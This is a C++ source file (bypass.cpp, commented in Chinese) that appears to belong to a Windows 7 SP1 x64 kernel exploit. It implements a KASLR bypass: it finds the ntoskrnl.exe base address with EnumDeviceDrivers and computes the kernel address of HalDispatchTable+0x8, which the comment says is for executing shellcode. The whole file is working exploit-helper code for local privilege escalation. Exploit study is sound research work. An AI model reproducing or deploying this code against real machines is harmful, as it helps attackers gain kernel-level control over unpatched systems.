/*
* bypass.cpp
* 绕过windows 7 sp1 x64下的防护措施, 主要针对KASLR
*/

#include "bypass.h"

/*
* getHalDispatchOffset8:
*	[+] 获取HalDispatchtable第二项的地址, 以执行shellcode
*/
DWORD64 getHalDispatchOffset8()
{
	// 获取xxx在kernel space 的基地址
	PVOID pKernelBase = getKernelBase();

	// 获取xxx在user space 的基地址
	HMODULE hUserSpaceBase = LoadLibrary("ntoskrnl.exe");

	// 获取HalDispatchTable 在user space的地址
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	// 算出其在 kernel space的偏移
	return (DWORD64)pKernelBase + ((DWORD64)pUserSpaceAddr - (DWORD64)hUserSpaceBase) + 0x8;
}

/*
* getKernelBase:
*	[+] 获取 ntoskrnl.exe 的基地址
*/
LPVOID getKernelBase()
{
	LPVOID  lpImageBase[1024];
	DWORD cbNeeded;
	TCHAR baseName[1024];
	// 使用EnumDeviceDriver来获取内核基地址
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &cbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		// 获取基地址的名字
		GetDeviceDriverBaseNameA(lpImageBase[i], baseName, 48);
		if(i == 0)
			std::cout << "[+] basename: " << baseName << std::endl;

		if (!strcmp(baseName, "ntoskrnl.exe"))
		{
			std::cout << "[+] ntoskrnl.exe at kernel space: " << lpImageBase[i] << std::endl;
			return lpImageBase[i];
		}

	}

	return NULL;
}